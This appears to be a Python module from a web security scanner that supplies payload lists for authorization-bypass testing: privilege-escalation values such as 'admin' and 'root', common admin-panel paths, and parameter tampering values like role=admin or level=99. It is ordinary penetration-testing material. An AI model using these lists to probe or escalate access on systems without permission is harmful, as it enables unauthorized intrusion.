"""
Authorization Bypass payloads
Contains payloads for testing authorization bypass vulnerabilities
"""

class AuthorizationBypassPayloads:
    """Authorization Bypass payload collection"""
    
    @staticmethod
    def get_all_payloads():
        """Get all authorization bypass payloads"""
        return (AuthorizationBypassPayloads.get_privilege_escalation_payloads() + 
                AuthorizationBypassPayloads.get_direct_access_paths() +
                AuthorizationBypassPayloads.get_parameter_manipulation_payloads())
    
    @staticmethod
    def get_privilege_escalation_payloads():
        """Get privilege escalation payloads"""
        return [
            'admin',
            'administrator',
            'root',
            'superuser',
            '1',
            'true',
            'yes',
            'on',
            'enabled',
            'active'
        ]
    
    @staticmethod
    def get_direct_access_paths():
        """Get direct access paths to test"""
        return [
            'admin/',
            'admin.php',
            'administrator/',
            'admin/index.php',
            'admin/admin.php',
            'admin/login.php',
            'admin/dashboard.php',
            'admin/panel.php',
            'admin/control.php',
            'management/',
            'manager/',
            'control/',
            'panel/',
            'dashboard/',
            'cpanel/',
            'webadmin/',
            'sysadmin/',
            'admincp/',
            'admin_area/',
            'admin_panel/',
            'controlpanel/',
            'user_admin/',
            'account_admin/',
            'system_admin/',
            'admin_login/',
            'admin_home/',
            'admin_console/'
        ]
    
    @staticmethod
    def get_parameter_manipulation_payloads():
        """Get parameter manipulation payloads for privilege escalation"""
        return {
            'role': ['admin', 'administrator', 'root', 'superuser', '1'],
            'admin': ['1', 'true', 'yes', 'on', 'enabled'],
            'user': ['admin', 'administrator', 'root'],
            'level': ['admin', '1', '9', '99', 'max'],
            'privilege': ['admin', 'full', 'all', '1', 'max'],
            'access': ['admin', 'full', 'all', '1', 'unlimited'],
            'permission': ['admin', 'all', 'full', '1', 'max'],
            'group': ['admin', 'administrators', 'root', 'wheel'],
            'type': ['admin', 'administrator', 'root'],
            'status': ['admin', 'active', 'enabled', '1']
        }
